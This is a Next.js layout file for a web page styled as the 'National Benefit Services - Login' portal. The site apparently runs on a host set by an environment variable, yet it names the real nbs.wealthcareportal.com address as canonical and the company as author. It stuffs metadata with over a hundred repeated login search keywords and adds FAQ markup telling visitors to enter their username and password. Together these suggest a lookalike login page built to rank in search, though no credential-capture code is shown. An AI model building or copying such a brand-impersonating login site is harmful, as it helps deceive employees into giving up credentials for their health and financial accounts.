import type React from "react";
import type { Metadata, Viewport } from "next";
import { Geist } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import "./globals.css";

const geist = Geist({ subsets: ["latin"] });

const CANONICAL_LOGIN_URL =
  "https://nbs.wealthcareportal.com/Authentication/Handshake";
const SITE_DOMAIN = "nbs.wealthcareportal.com";
const SITE_BRAND = "National Benefit Services";

export const metadata: Metadata = {
  metadataBase: new URL(
    process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
  ),
  title: {
    default: "National Benefit Services - Login",
    template: "%s | National Benefit Services",
  },
  keywords: [
    "National Benefit Services",
    "National Benefit Services Orthi Development Corporation",
    "National Benefit Services Orthi Development Corporation Login",
    "National Benefit Services Aloha Care",
    "National Benefit Services Aloha Care login",
    "national benefit services login",
    "national benefit services llc",
    "national benefit services hawaii",
    "national benefit services hsa",
    "national benefit services utah",
    "national benefit services address",
    "national benefit services hsa login",
    "national benefit services fsa login",
    "national benefit services phone number",
    "NBS Orthi Development Corporation login",
    "NBS Orthi Development Corporation",
    "NBS Aloha Care login",
    "NBS Aloha Care",
    "benefits portal login",
    "employee benefits login",
    "secure benefits login",
    "reimbursement account login",
    "participant portal access",
    "NBS benefits",
    "NBS login",
    "NBS employee benefits",
    "National Benefit Services portal",
    "how to access my FSA account online",
    "secure employee benefits portal login",
    "best way to manage HSA online",
    "how to submit reimbursement claims",
    "employer benefits administration portal",
    "participant reimbursement account access",
    "nbs.wealthcareportal.com",
    "benefits login",
    "employee benefits portal",
    "FSA login",
    "HSA login",
    "COBRA login",
    "account access",
    "health benefits",
    "dependent care",
    "reimbursement account",
    "secure login",
    "participant portal",
    "employer portal",
    "handshake authentication",
    "employer benefits administration",
    "employee benefits management",
    "benefits administration services",
    "COBRA login",
    "COBRA administration",
    "continuation coverage portal",
    "FSA login",
    "reimbursement account",
    "dependent care reimbursement",
    "HSA login",
    "online HSA management",
    "health savings account portal",
    "benefits portal login",
    "NBS login",
    "employee benefits login",
    "secure benefits login",
    "how to submit reimbursement claims",
    "how to access FSA account online",
    "best way to manage HSA online",
    "benefits administration platform",
    "secure employee portal access",
    "employee benefits administration",
    "online HSA management",
    "secure benefits portal",
    "reimbursement account access",
    "employer benefits administration portal",
    "National Benefit Services HSA login",
    "National Benefit Services FSA login",
    "handshake authentication login",
    "secure portal authentication",
    "two-factor authentication benefits portal",
    "employee portal verification",
    "secure reimbursement account access",
    "account recovery benefits portal",
    "benefits portal password reset",
    "how to access my FSA account online",
    "how to submit reimbursement claims",
    "how to manage HSA online",
    "how to check FSA balance",
    "how to file reimbursement claims online",
    "how to log into employee benefits portal",
    "how to access participant reimbursement account",
    "how does an HSA work",
    "what expenses qualify for FSA reimbursement",
    "benefits administration services",
    "employee benefits management",
    "employer benefits administration portal",
    "third-party benefits administrator",
    "employee reimbursement administration",
    "flexible benefits administration",
    "online employee benefits platform",
    "National Benefit Services HSA login",
    "National Benefit Services FSA login",
    "National Benefit Services COBRA login",
    "National Benefit Services participant login",
    "NBS login portal",
    "NBS HSA login",
    "NBS FSA login",
    "NBS account login",
    "NBS secure portal",
  ],
  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through National Benefit Services.`,

  authors: [{ name: "National Benefit Services" }],
  creator: "National Benefit Services",
  publisher: "National Benefit Services",
  applicationName: SITE_BRAND,
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    title: "National Benefit Services - Login",
    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through ${SITE_BRAND}.`,
    siteName: SITE_BRAND,
    url: CANONICAL_LOGIN_URL,
    images: [
      {
        url: "/favicon-32x32.png",
        width: 32,
        height: 32,
        alt: `${SITE_BRAND}`,
      },
    ],
  },
  twitter: {
    card: "summary",
    title: "National Benefit Services - Login",
    description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through ${SITE_BRAND}.`,
    images: ["/favicon-32x32.png"],
  },
  icons: {
    icon: "/favicon-32x32.png",
    shortcut: "/favicon-32x32.png",
    apple: "/favicon-32x32.png",
  },
  category: "Business",
  alternates: {
    canonical: CANONICAL_LOGIN_URL,
    languages: {
      "en-US": CANONICAL_LOGIN_URL,
    },
  },
  other: {
    "geo.region": "US",
  },
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  themeColor: "#254650",
};

const organizationSchema = {
  "@context": "https://schema.org",
  "@type": "Organization",
  name: SITE_BRAND,
  url: CANONICAL_LOGIN_URL,
  logo: `${process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL}/Nbs%20banner_new.png`,
  description:
    "National Benefit Services provides secure access to FSA, HSA, COBRA, and dependent care benefits through our employee benefits portal.",
  sameAs: [],
  contactPoint: {
    "@type": "ContactPoint",
    contactType: "Customer Support",
    availableLanguage: ["en"],
  },
};

const faqSchema = {
  "@context": "https://schema.org",
  "@type": "FAQPage",
  mainEntity: [
    {
      "@type": "Question",
      name: "How do I login to my National Benefit Services account?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "Visit the National Benefit Services participant portal and enter your username and password. Select your user role (Participant, Employer, Broker, or Administrator) and click LOGIN.",
      },
    },
    {
      "@type": "Question",
      name: "What is FSA login and how do I access it?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "FSA (Flexible Spending Account) login allows you to manage your health and dependent care reimbursement accounts through the National Benefit Services portal.",
      },
    },
    {
      "@type": "Question",
      name: "How do I reset my National Benefit Services password?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "Click the forgot password link on the login page. Follow the verification steps and set a new password for your account.",
      },
    },
    {
      "@type": "Question",
      name: "What benefits can I manage through this employee benefits portal?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "You can manage FSA (health and dependent care), HSA, COBRA continuation coverage, and other employee benefits through your secure account.",
      },
    },
  ],
};

const jsonLd = [organizationSchema, faqSchema];

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en-US">
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body className={`${geist.className} font-sans antialiased`}>
        {jsonLd.map((schema, idx) => (
          <script
            key={idx}
            type="application/ld+json"
            dangerouslySetInnerHTML={{ __html: JSON.stringify(schema) }}
          />
        ))}
        {children}
        <Analytics />
      </body>
    </html>
  );
}
